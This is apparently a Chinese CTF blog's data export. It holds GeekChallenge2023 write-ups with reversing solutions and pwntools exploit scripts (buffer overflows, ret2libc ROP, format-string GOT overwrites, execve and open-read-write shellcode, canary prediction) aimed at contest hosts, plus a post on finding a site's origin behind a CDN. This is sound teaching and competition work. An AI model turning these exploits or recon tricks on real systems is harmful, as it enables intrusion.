{"pages":[{"title":"links","text":"友链好耶！快来加友链 lazy: https://lazy.ink/","link":"/links/index.html"},{"title":"about","text":"是个笨蛋，喜欢ctf，多多指教呀","link":"/about/index.html"}],"posts":[{"title":"GeekChallenge2023","text":"re点击就送的逆向题.S的文件 使用as命令来汇编一下，然后ida打开分析逻辑 1as -o output.o input.S 置反一下逻辑 1234567891011121314151617int __cdecl main(int argc, const char **argv, const char **envp){ int i; // [rsp+Ch] [rbp-54h] char s1[32]; // [rsp+10h] [rbp-50h] BYREF char s2[40]; // [rsp+30h] [rbp-30h] BYREF unsigned __int64 v7; // [rsp+58h] [rbp-8h] v7 = __readfsqword(0x28u); strcpy(s2, &quot;Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM&quot;); _isoc99_scanf(&amp;unk_F4, s1); for ( i = 0; i &lt;= 31; ++i ) s1[i] += 7; if ( !strcmp(s1, s2) ) printf(&quot;wrong!&quot;); puts(&quot;good!&quot;); return 0;} 12345flag = &quot;Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM&quot;for i in range(len(flag)): byte = ord(flag[i]) - 7 print(chr(byte),end=&quot;&quot;) 1SYC{SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFF} shiftjmp有个jmp的花指令 nop掉后，对着main u p 重新打包main函数反编译 12345678910111213141516int __cdecl main(int argc, const char **argv, const char **envp){ int i; // [rsp+Ch] [rbp-4h] puts(&quot;flag:&quot;); for ( i = 0; i &lt;= 33; ++i ) { if ( rodata[i] ^ i ^ getchar() ) { puts(&quot;no&quot;); return 0; } } puts(&quot;yes&quot;); return 0;} 12345flag = [0x53, 0x58, 0x41, 0x78, 0x53, 0x36, 0x6A, 0x64, 0x38, 0x64, 0x6F, 0x54, 0x78, 0x42, 0x51, 0x7B, 0x78, 0x22, 0x4D, 0x61, 0x27, 0x63, 0x73, 0x45, 0x2D, 0x7C, 0x45, 0x6C, 0x2C, 0x6F, 0x2F, 0x7B, 0x5E, 0x5C, 0x00]for i in range(len(flag)): byte = flag[i] ^ i print(chr(byte),end=&quot;&quot;) 幸运数字这里的问题，其实是求解 找0xD3范围内的i异或cmp数组 哪个开头是SYC，因为与运算有截断这个特性，所以范围是0xD3 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566int __cdecl main(int argc, const char **argv, const char **envp){ int v4; // ebx unsigned int v5; // eax unsigned __int8 cmp_data[41]; // [rsp+20h] [rbp-60h] BYREF unsigned int inputString; // [rsp+54h] [rbp-2Ch] BYREF int lenth; // [rsp+58h] [rbp-28h] int i; // [rsp+5Ch] [rbp-24h] _main(argc, argv, envp); qmemcpy(cmp_data, &quot;\\r\\a&quot;, 2); cmp_data[2] = 29; cmp_data[3] = 37; cmp_data[4] = 29; cmp_data[5] = 110; cmp_data[6] = 48; cmp_data[7] = 57; cmp_data[8] = 44; cmp_data[9] = 63; cmp_data[10] = 42; cmp_data[11] = 43; cmp_data[12] = 50; cmp_data[13] = 63; cmp_data[14] = 42; cmp_data[15] = 55; cmp_data[16] = 110; cmp_data[17] = 48; cmp_data[18] = 48; cmp_data[19] = 48; cmp_data[20] = 48; cmp_data[21] = 45; cmp_data[22] = 1; cmp_data[23] = 7; cmp_data[24] = 49; cmp_data[25] = 43; cmp_data[26] = 1; cmp_data[27] = 57; cmp_data[28] = 31; cmp_data[29] = 59; cmp_data[30] = 45; cmp_data[31] = 45; cmp_data[32] = 27; cmp_data[33] = 58; cmp_data[34] = 1; cmp_data[35] = 12; qmemcpy(&amp;cmp_data[36], &quot;o96*#&quot;, 5); printf(&amp;Format); scanf(&quot;%u&quot;, &amp;inputString); if ( inputString &lt;= 0x3E7 ) { lenth = 41; puts(&amp;Buffer); for ( i = 0; i &lt; lenth; ++i ) { v4 = cmp_data[i]; v5 = result(inputString); printf(&quot;%c&quot;, v4 ^ (v5 % 0xD3)); } return 0; } else { printf(&amp;byte_40401C); return 0; }} 1234567cmp_data = [0x0D, 0x07, 0x1D, 0x25, 0x1D, 0x6E, 0x30, 0x39, 0x2C, 0x3F, 0x2A, 0x2B, 0x32, 0x3F, 0x2A, 0x37, 0x6E, 0x30, 0x30, 0x30, 0x30, 0x2D, 0x01, 0x07, 0x31, 0x2B, 0x01, 0x39, 0x1F, 0x3B, 0x2D, 0x2D, 0x1B, 0x3A, 0x01, 0x0C, 0x6F, 0x39, 0x36, 0x2A, 0x23, 0x15, 0x40]for i in range(0xd3): for j in cmp_data: byte = j ^ i; print(chr(byte),end=&quot;&quot;) print(&quot;\\n&quot;) 砍树native 看下面调用str2应该是key 1234567public static native int I0o0I(String str, String str2);public native String skkkyJNI();static { System.loadLibrary(&quot;ezreeeee&quot;);} 根据输入和key进行加密然后和dest cmp，大概是这样的一个逻辑 12345678910111213141516171819_BOOL8 __fastcall Java_com_sky_ezreeeee_MainActivity_I0o0I(__int64 a1, __int64 a2, __int64 a3, __int64 a4){ int i; // [rsp+Ch] [rbp-64h] __int64 v6; // [rsp+10h] [rbp-60h] _BOOL4 v7; // [rsp+1Ch] [rbp-54h] unsigned __int8 *v9; // [rsp+20h] [rbp-50h] unsigned __int8 *inputString; // [rsp+28h] [rbp-48h] char dest[40]; // [rsp+40h] [rbp-30h] BYREF unsigned __int64 v12; // [rsp+68h] [rbp-8h] v12 = __readfsqword(0x28u); inputString = (unsigned __int8 *)jstring_2unsigchar(a1, a3); v9 = (unsigned __int8 *)jstring_2unsigchar(a1, a4); v6 = A0OWO0A(inputString, v9); memcpy(dest, &amp;byte_14900, 0x23uLL); for ( i = 0; i &lt; 34; ++i ) v7 = *(unsigned __int8 *)(v6 + i) == (unsigned __int8)dest[i]; return v7;} A0OWO0A的实现 12345678unsigned __int8 *__fastcall A0OWO0A(unsigned __int8 *inputString, const unsigned __int8 *key){ int i; // [rsp+4h] [rbp-14h] for ( i = 0; i &lt; 34; ++i ) inputString[i] ^= key[i % 7]; return inputString;} 解密脚本 12345678910111213flag = [0x00, 0x20, 0x20, 0x17, 0x1B, 0x36, 0x0E, 0x36, 0x26, 0x17, 0x04, 0x2A, 0x29, 0x07, 0x26, 0x15, 0x52, 0x33, 0x2D, 0x0F, 0x3A, 0x27, 0x11, 0x06, 0x33, 0x07, 0x46, 0x17, 0x3D, 0x0A, 0x3C, 0x38, 0x2E, 0x22, 0x18]a = &quot;Sycloverforerver&quot;key = [ord(i) for i in a]for i in range(len(flag)): byte = flag[i] ^ key[i % 7] print(chr(byte),end=&quot;&quot;) 听说cpp很难？无用的代码比较多，这时候应该从后往前分析，从success的逻辑开始往前找，发现关键的加密逻辑，也是就test67那 12345678910111213for ( k = std::vector&lt;char&gt;::begin(v16); ; __gnu_cxx::__normal_iterator&lt;char *,std::vector&lt;char&gt;&gt;::operator++( &amp;k, 0i64) ){ v21 = std::vector&lt;char&gt;::end(v16); if ( !(unsigned __int8)__gnu_cxx::operator!=&lt;char *,std::vector&lt;char&gt;&gt;(&amp;k, &amp;v21) ) break; v6 = (_BYTE *)__gnu_cxx::__normal_iterator&lt;char *,std::vector&lt;char&gt;&gt;::operator*(&amp;k); *v6 += v17[44]; v7 = *(char *)__gnu_cxx::__normal_iterator&lt;char *,std::vector&lt;char&gt;&gt;::operator*(&amp;k); v8 = (_BYTE *)__gnu_cxx::__normal_iterator&lt;char *,std::vector&lt;char&gt;&gt;::operator*(&amp;k); *v8 = text_67(v17, v7);} 12345__int64 __fastcall text_67(__int64 a1, char a2){ *(_DWORD *)(a1 + 40) = 9; return (unsigned __int8)(((*(_DWORD *)(a1 + 40) + 1) ^ a2) - *(_DWORD *)(a1 + 40) - 1);} 也就是这个逻辑，test_67外边可以一个*v6 += v17[44];的逻辑，打开看了一下是0xa 1(inputString[i] ^ 10) - 9 - 1 所以也就是 1((cmpStr[i] + 10) ^ 10) - 0xa 123456789101112131415v19 = [ 77, 95, 61, -123, 55, 104, 115, 87, 39, 104, 81, 89, 127, 38, 107, 89, 115, 87, 85, 91, 89, 111, 106, 89, 39, 87, 114, 87, 79, 87, 120, 120, -125]for i in range(len(v19)): v19[i] = ((v19[i] + 10) ^ 10) - 0xafor i in v19: if i &lt; 0: continue print(chr(i),end=&quot;&quot;) pwnnc_pwntools可以用ctypes来调用libc中的srand rand 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *from LibcSearcher import *from ctypes import *context(os='linux',arch='amd64',log_level='debug')elf = context.binary = ELF('./chal')libc = cdll.LoadLibrary('libc.so.6')libc.srand(libc.time(0))is_debug = 0if(is_debug): p = process()else: ip = &quot;pwn.node.game.sycsec.com&quot; port = 31955 p = remote(ip,port) # send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(sa)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda x: p.recvline(x)ru = lambda x: p.recvuntil(x)payload = b'a' * 92 + b'Syclover'p.send(payload)random_number1 = libc.rand() % 100000 + 5646488;random_number2 = libc.rand() % 10000 + 3214590;random_number3 = libc.rand() % 1000 + 6521;random_number4 = libc.rand() % 10000 + 98714;result = (random_number1 - random_number2) * random_number3 % random_number4result = str(result).encode()p.sendline(result)p.interactive() ret2text程序开启了pie，但是backdoor和vuln的偏移非常近，不超过一个字节的偏移，原有的return上面就已经有了前面部分的地址，所以只需要覆盖低位一个字节的内容，就能return到backdoor上面 123456789101112131415161718.text:000000000000120E F3 0F 1E FA endbr64.text:0000000000001212 55 push rbp.text:0000000000001213 48 89 E5 mov rbp, rsp.text:0000000000001216 48 83 EC 10 sub rsp, 10h.text:000000000000121A C7 45 FC 00 00 00 00 mov [rbp+var_4], 0.text:0000000000001221 83 7D FC 01 cmp [rbp+var_4], 1.text:0000000000001225 75 11 jnz short loc_1238.text:0000000000001225.text:0000000000001227 48 8D 3D DA 0D 00 00 lea rdi, command ; &quot;/bin/sh&quot;.text:000000000000122E B8 00 00 00 00 mov eax, 0.text:0000000000001233 E8 58 FE FF FF call _system.text:0000000000001233.text:0000000000001238.text:0000000000001238 loc_1238: ; CODE XREF: backdoor+17↑j.text:0000000000001238 90 nop.text:0000000000001239 C9 leave.text:000000000000123A C3 retn.text:000000000000123A ; } / 12345678910111213141516171819.text:000000000000123B ; __unwind {.text:000000000000123B F3 0F 1E FA endbr64.text:000000000000123F 55 push rbp.text:0000000000001240 48 89 E5 mov rbp, rsp.text:0000000000001243 48 83 EC 50 sub rsp, 50h.text:0000000000001247 48 8D 3D C2 0D 00 00 lea rdi, s ; &quot;The simplest but not too simple pwn&quot;.text:000000000000124E E8 2D FE FF FF call _puts.text:000000000000124E.text:0000000000001253 48 8D 45 B0 lea rax, [rbp+buf].text:0000000000001257 BA 60 00 00 00 mov edx, 60h ; '`' ; nbytes.text:000000000000125C 48 89 C6 mov rsi, rax ; buf.text:000000000000125F BF 00 00 00 00 mov edi, 0 ; fd.text:0000000000001264 B8 00 00 00 00 mov eax, 0.text:0000000000001269 E8 32 FE FF FF call _read.text:0000000000001269.text:000000000000126E 90 nop.text:000000000000126F C9 leave.text:0000000000001270 C3 retn.text:0000000000001270 ; } // starts at 123B 12345678910111213141516171819202122232425262728293031323334from pwn import *from LibcSearcher import *context(os='linux',arch='amd64',log_level='debug')elf = context.binary = ELF('./ret2text')is_debug = 1if(is_debug): p = process()else: ip = &quot;1.container.jingsai.apicon.cn&quot; port = 30926 p = remote(ip,port) # send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(sa)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda x: p.recvline(x)ru = lambda x: p.recvuntil(x)payload = b'a' * (0x50 + 0x8)payload += p8(0x27)#gdb.attach(p)p.send(payload)p.interactive() password有一个backdoor函数，name那存在一个溢出，刚刚好是八个字节，能覆盖返回地址，password这里是通过read /dev/urandom来生成的，去看了下urandome 有时候会出来\\x00，想到strcmp 是根据\\x00来识别字符串，再cmp的，那假设第一位是\\x00，爆破password 123456789101112131415161718int __cdecl main(int argc, const char **argv, const char **envp){ char s[64]; // [rsp+0h] [rbp-60h] BYREF char buf[32]; // [rsp+40h] [rbp-20h] BYREF init(); puts(&quot;please enter user name:&quot;); read(0, buf, 0x30uLL); puts(&quot;please enter password:&quot;); fgets(s, 64, stdin); if ( strcmp(s, password) ) { puts(&quot;Wrong password!&quot;); exit(0); } puts(&quot;Correct password!&quot;); return 0;} 1234567891011int init(){ FILE *stream; // [rsp+8h] [rbp-8h] setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); stream = fopen(&quot;/dev/urandom&quot;, &quot;r&quot;); fgets(password, 64, stream); return fclose(stream);} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *from LibcSearcher import *import ctypes# context(os='linux',arch='amd64',log_level='debug')elf = context.binary = ELF('./password')is_debug = 1# if(is_debug):# p = process()# else:# ip = &quot;pwn.node.game.sycsec.com&quot;# port = 30872# p = remote(ip,port)# gdb.attach(p)g = lambda x: gdb.attach(x)# send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(sa)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda x: p.recvline(x)ru = lambda x: p.recvuntil(x)payload = b'a' * (0x20 + 0x8)payload += p64(0x00000000004012F3) # backdoorip = &quot;pwn.node.game.sycsec.com&quot;port = 31233while True: p = remote(ip,port) p.sendafter(b&quot;name:\\n&quot;,payload) p.sendlineafter(b&quot;password:\\n&quot;,b'\\x00') s = p.recvline() print(s) if(b&quot;Correct&quot; in s): break p.close()p.interactive() ret2libc先用write泄露got表的地址，然后计算libc的基地址，拿到system和binsh后，正常的rop 找了半天没有找到修改rdx寄存器的gadget，后面发现这里有一个非常合适的gadget 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from pwn import *from LibcSearcher import *context(os='linux',arch='amd64',log_level='debug')elf = context.binary = ELF('./ret2libc')libc = ELF('./libc.so.6')is_debug = 1if(is_debug): p = process()else: ip = &quot;pwn.node.game.sycsec.com&quot; port = 31982 p = remote(ip,port)# gdb.attach(p)g = lambda x: gdb.attach(x)# send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(sa)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda x: p.recvline(x)ru = lambda x: p.recvuntil(x)rdi = 0x0000000000401333rsi_r15 = 0x0000000000401331csu1 = 0x0000000000401310csu2 = 0x0000000000401326main = 0x000000000040126Fret = 0x000000000040101ainit_proc = 0x0000000000401000rdx = 0x0000000000401288# g(p)# sla(b&quot;This challenge no backdoor!&quot;,flat([ b'\\x00' * (0x10 + 0x8), rsi_r15, elf.got.write, 0, rdx,]))leek_write = u64(ru(b'\\x7f')[-6:].ljust(8,b'\\x00'))success(f&quot;success-&gt; {hex(leek_write)}&quot;)libc_base = leek_write - libc.symbols['write']success(f&quot;libc_base-&gt; {hex(libc_base)}&quot;)system = libc_base + libc.symbols['system']binsh= libc_base + next(libc.search(b&quot;/bin/sh\\x00&quot;))success(f&quot;system-&gt; {hex(system)}&quot;)success(f&quot;binsh-&gt; {hex(binsh)}&quot;)# g(p)sla(b&quot;This challenge no backdoor!&quot;,flat([ b'\\x00' * (0x10 + 0x8), rdi,binsh,system]))p.interactive() 看到的一种很有意思的做法，https://www.cnblogs.com/mumuhhh/p/17860207.html 这里，用magic gadget，配合csu实现任意地址写，写got表，然后写one gadget的地址来getshell write1*((_BYTE *)v2 + v1) += tmp; 这里有一个任意地址写的漏洞，可以一个字节一个字节的修改数据，程序中有一个backdoor函数，可以把返回地址修改成backdoor然后再输入一个&lt;0的数退出循环，注意__isoc99_scanf(“%x”, &amp;tmp); 是十六进制的，所以输入也应该是十六进制的 12345678910111213141516171819202122unsigned __int64 do_something(){ int v1; // [rsp+Ch] [rbp-24h] BYREF __int64 v2[3]; // [rsp+10h] [rbp-20h] unsigned __int64 v3; // [rsp+28h] [rbp-8h] v3 = __readfsqword(0x28u); __isoc99_scanf(&quot;%s&quot;, &amp;s); v2[0] = s; v2[1] = qword_404098; while ( 1 ) { puts(&quot;index:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 &lt; 0 ) break; printf(&quot;value:&quot;); __isoc99_scanf(&quot;%x&quot;, &amp;tmp); *((_BYTE *)v2 + v1) += tmp; } return v3 - __readfsqword(0x28u);} 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from LibcSearcher import *context(os='linux',arch='amd64',log_level='debug')elf = context.binary = ELF('./write')is_debug = 0if(is_debug): p = process()else: ip = &quot;pwn.node.game.sycsec.com&quot; port = 31253 p = remote(ip,port) g = lambda x: gdb.attach(x)# send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda x: p.recvline(x)ru = lambda x: p.recvuntil(x)sl(b'aaaa')sl(b'40')sl(b'-0x28')sl(b'41')sl(b'-0x1')sl('-1')p.interactive() ezpwnret2shellcode 0x13h - 0x8 = 11个字节，这个太难受了，一开始想着把shellcode拆成两半，后半段放在开始，前半段放在后面，然后结尾jmp，第一次尝试写shellcode，写来写去最短也要22个字节，网上找了一些16字节的发现都有些问题。后面发现syscall再read再read一遍写足够大的位置不就好了 1234567891011121314151617181920212223242526272829303132; Segment type: Pure code; Segment permissions: Read/Execute_text segment byte public 'CODE' use64assume cs:_text;org 801000hassume es:nothing, ss:nothing, ds:LOAD, fs:nothing, gs:nothing; Attributes: bp-based frame; void fun()public funfun proc nearanonymous_0= byte ptr -20h; __unwind {push rbpmov rbp, rspsub rsp, 20hxor eax, eaxxor edi, edi ; fdmov rsi, rsp ; bufmov edx, 13h ; countsyscall ; LINUX - sys_readadd rsi, 8jmp rsi; } // starts at 801000fun endp_text ends 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import *from LibcSearcher import *context(os='linux',arch='amd64',log_level='debug')elf = context.binary = ELF('./ezpwn')# libc = ELF('./libc.so.6')is_debug = 0if(is_debug): p = process()else: ip = &quot;pwn.node.game.sycsec.com&quot; port = 31578 p = remote(ip,port)# gdb.attach(p)g = lambda x: gdb.attach(x)# send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda x: p.recvline(x)ru = lambda x: p.recvuntil(x)# syscall readshellcode1 = ''' xor eax,eax push 0x50 pop rdx add rsi,11 syscall'''shellcode1 = b'a' * 8 + asm(shellcode1)# g(p)s(shellcode1)# g(p)#execve(/bin/sh)shellcode2 = ''' mov rax,0x68732f6e69622f push rax push rsp pop rdi push 0x3b pop rax xor esi, esi xor edx, edx syscall''' # shellcode2 = asm(shellcraft.sh())shellcode2 = asm(shellcode2)s(shellcode2)p.interactive() write2vmmap 发现栈上有可执行的权限，任意地址写，直接往rbp + 16写shellcode，然后把rbp + 8改成rbp + 16的地址就好了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *from LibcSearcher import *context(os='linux',arch='amd64',log_level='debug')elf = context.binary = ELF('./write2')# libc = ELF('./libc.so.6')is_debug = 1if(is_debug): p = process()else: ip = &quot;pwn.node.game.sycsec.com&quot; port = 30602 p = remote(ip,port)# gdb.attach(p)g = lambda x: gdb.attach(x)# send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda : p.recvline()ru = lambda x: p.recvuntil(x)ru(b&quot;index_addr:&quot;)addr = int(p.recv(14).decode(&quot;utf-8&quot;),16) return_addr = addr + 0x34success(f&quot;return_addr -&gt; {hex(return_addr)}&quot;)shellcode = ''' mov rax,0x68732f6e69622f push rax push rsp pop rdi push 0x3b pop rax xor esi, esi xor edx, edx syscall'''shellcode = asm(shellcode)sl(b'a')for i in range(len(shellcode)): sl(str(0x30 + i).encode()) sl(str(hex(shellcode[i])[2:]).encode())for i in range(6): byte = return_addr &amp; 0xff sl(str(0x28 + i).encode()) sl(hex(byte)[2:]) return_addr &gt;&gt;= 8sl(b'-1')p.interactive() white_canaryvmmap发现bss有可执行的权限，第一次read buf，往一块有可读可写可执行的地址写数据，第二次gets可以溢出，但是seccomp禁用了execve系统调用，然后有个canary，但canary是通过随机数生成出来的 所以思路是先往buf中写orw的shellcode，然后溢出修改返回地址执行这个shellcode把flag读出来 open(flag,0,0) read(fd,buf,size) write(fd,buf,size) 用ctypes模拟canary的生成，溢出的时候带上canary就好了，gdb看了一下，是取生成的canary的第八字节，然后写到fs段偏移0x28 123456789101112131415161718int __cdecl main(int argc, const char **argv, const char **envp){ __int64 v4; // [rsp+8h] [rbp-18h] char v5[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); v4 = seccomp_init(2147418112LL, argv, envp); seccomp_rule_add(v4, 0LL, 59LL, 0LL); seccomp_load(v4); puts(&quot;You are lost in a forest of pwn,find the secret of this world&quot;); puts(&quot;You find a man,he said:If you want to get out of here, you need to tell me your name!&quot;); puts(&quot;Please enter your name:&quot;); read(0, &amp;buf, 0x64uLL); puts(&quot;tell me something:&quot;); gets(v5); return 0;} 12345678910111213141516171819int init(){ time_t seed; // [rsp+8h] [rbp-28h] __int64 v2; // [rsp+10h] [rbp-20h] __int64 v3; // [rsp+18h] [rbp-18h] setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); seed = time(0LL) % 60; srand(seed); v2 = rand(); v3 = rand(); __writefsqword( 0x28u, (((v2 &gt;&gt; 4) ^ (16 * v3 + (v3 &gt;&gt; 8) * (v2 &lt;&lt; 8))) &gt;&gt; 32) + ((((v2 &gt;&gt; 48) + (v2 &lt;&lt; 16) * (v3 &gt;&gt; 16)) ^ (v3 &lt;&lt; 48)) &lt;&lt; 32)); return mprotect(&amp;GLOBAL_OFFSET_TABLE_, 0x1000uLL, 7);} 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *from LibcSearcher import *import ctypescontext(os='linux',arch='amd64',log_level='debug')elf = context.binary = ELF('./chal')# libc = ELF('./libc.so.6')## srandlibc = ctypes.CDLL(os.path.join(os.getcwd(), 'libc.so.6'))seed = libc.time(None) % 60libc.srand(seed)is_debug = 1if(is_debug): p = process()else: ip = &quot;pwn.node.game.sycsec.com&quot; port = 31936 p = remote(ip,port)# gdb.attach(p)g = lambda x: gdb.attach(x)# send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda : p.recvline()ru = lambda x: p.recvuntil(x)v2 = libc.rand()v3 = libc.rand()canary = (((v2 &gt;&gt; 4) ^ (16 * v3 + (v3 &gt;&gt; 8) * (v2 &lt;&lt; 8))) &gt;&gt; 32) + ((((v2 &gt;&gt; 48) + (v2 &lt;&lt; 16) * (v3 &gt;&gt; 16)) ^ (v3 &lt;&lt; 48)) &lt;&lt; 32)canary = canary &amp; 0xFFFFFFFFFFFFFFFFsuccess(f&quot;Canary -&gt; {hex(canary)}&quot;)orw_shellcode = asm('''mov edx,0x67616c66push rdx push rsppop rdixor esi,esi mov eax,0x2 syscallpush 0x50pop rdxmov edi,eaxmov rsi,rspxor eax,eaxsyscallpush 0x50pop rdxxor edi,2mov eax,edisyscall''')# g(p)sa(&quot;Please enter your name:\\n&quot;,orw_shellcode)# g(p)payload = b'a' * (0x10 - 0x8) + p64(canary) + b'a' * 8 + p64(0x00000000004040E0)sla(b&quot;tell me something:\\n&quot;, payload)p.interactive() fmt1.0[补]咱是笨蛋，这个printf很奇怪，没有想到格式化字符串修改printf的got表，为execve，咱以为是格式化字符串连续写，然后ret2libc，后面看其他师傅的wp后发现，可以修改这个printf的 got表位execve 1234567891011__int64 vuln(){ char s[80]; // [rsp+0h] [rbp-50h] BYREF memset(s, 0, sizeof(s)); puts(&quot;Please enter your username: &quot;); read(0, s, 0x60uLL); printf(&quot;Hello,&quot;); printf(s, 0LL); return 0LL;} 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pwn import *from LibcSearcher import *# context.terminal = ['gnome-terminal', '-e']context(os='linux',arch='amd64',log_level='debug')elf = context.binary = ELF('./fmt1.0')libc = ELF('./libc.so.6')# is_debug = 1# if(is_debug):# p = process()# else:# ip = &quot;node4.buuoj.cn&quot;# port = 29349# p = remote(ip,port)# gdb.attach(p)g = lambda x: gdb.attach(x)# send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda : p.recvline()ru = lambda x: p.recvuntil(x)# def exec_fmt(pad):# p = process(&quot;./fmt1.0&quot;) # p.recvuntil(b&quot;Please enter your username: \\n&quot;)# p.send(pad)# p.recvuntil(b&quot;Hello,&quot;)# return p.recv()# fmt = FmtStr(exec_fmt)# success(f&quot;offset -&gt;{str(fmt.offset)}&quot;)p = process(&quot;./fmt1.0&quot;)# g(p)# payload = fmtstr_payload(6,{0x7fffffffe220:0x1337babe})# print(payload)p.recvuntil(b&quot;Please enter your username: \\n&quot;)main = 0x4012CApayload = fmtstr_payload(6,{elf.got[&quot;printf&quot;]:elf.plt[&quot;execve&quot;]})success(f&quot;payload -&gt;{payload}&quot;)payload = payload.ljust(0x58,b'\\x00') + p64(main)s(payload)sl(b&quot;/bin/sh\\x00&quot;)p.interactive() fmt2.0[补]有两次printf格式化字符串，第一次泄露一个libc相关的地址和栈上的地址算出libc_base和返回地址，第二次把返回地址修改成one_gadget的地址 12345678910111213141516int __cdecl main(int argc, const char **argv, const char **envp){ char buf[88]; // [rsp+0h] [rbp-60h] BYREF unsigned __int64 v5; // [rsp+58h] [rbp-8h] v5 = __readfsqword(0x28u); init(argc, argv, envp); printf(&quot;frist str:&quot;); read(0, buf, 0x50uLL); printf(buf); putchar(10); printf(&quot;second str:&quot;); read(0, buf, 0x50uLL); printf(buf); return 0;} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *from LibcSearcher import *context(os='linux',arch='i386',log_level='debug')elf = context.binary = ELF('./fmt2.0')libc = elf.libcis_debug = 1if(is_debug): p = process()else: ip = &quot;node4.buuoj.cn&quot; port = 29349 p = remote(ip,port)# gdb.attach(p)g = lambda x: gdb.attach(x)# send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda : p.recvline()ru = lambda x: p.recvuntil(x)r_leek_libc_64 = lambda : u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))r_leek_libc_32 = lambda : u32(p.recvuntil(b'\\xf7')[-4:])sl(b&quot;aaaa%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&quot;)ru(b&quot;aaaa&quot;)leek_addr = int(r(14),16)ret_addr = leek_addr + 0x68success(f&quot;ret_addr -&gt; {hex(ret_addr)}&quot;)ru(b&quot;0x50-&quot;)read_addr = int(r(14),16)read_addr -= 0x12libc_base = read_addr - libc.sym['read']success(f&quot;libc_base -&gt; {hex(libc_base)}&quot;)one=0xe3b01# g(p)payload=fmtstr_payload(6,{ret_addr:libc_base+one},write_size='short')sl(payload)p.interactive() fmt3.0[补]ez_fullprotection[补]mips[补]why_not_puts[补]eva[补]Cyptoeasy_classic有些绕 凯撒-&gt;栅栏-&gt;base64-&gt;熊曰-&gt;key base100 emjoy-&gt;playfair 1SYC{classical_1s_fun} SignIn十六进制转字符串 1SYC{Hello_World_Crypto_bibobibo}","link":"/2023/12/28/GeekChallenge2023/"},{"title":"cdn绕过大全tips思路","text":"[toc] cdn绕过技巧tipscdn判断方式: 超级ping多地ping1配置不安全 | 超级ping&amp;多地ping&amp;冷门地区国家ping以阿里云cdn为例子，在配置cdn的面板上有这几个选项 在加速区域中，有全部加速区域，仅中国内地，全球（不包括中国内地） 一般搞运维的人员在配置各种服务的时候，都会根据实际需求来配置，因为额外的可能要钱，可能其他cdn厂商加速的地区越多收的钱越多，比如说公司业务范围只在国内的会配置仅中国内地，业务在国外的可能会配置 全球(不包含中国内地)，当然这个不是非常绝对的，只是大多数情况下。 这时候只要使用全球ping超级ping之类的，国外发起在请求就能很简单绕过 如果配置了全部加速区域的话，这时候需要从冷门的地区下手，像一些网络不发达的地区比如非洲啊之类的，大概率情况下厂商都不会在这些地方配置节点。 12345涉及资源: 资源具有时效性，搜索关键词: 超级ping&amp;网站测速&amp;在线ping&amp;全球ping 等等https://www.17ce.com/ 超级pinghttps://www.itdog.cn/ping/ 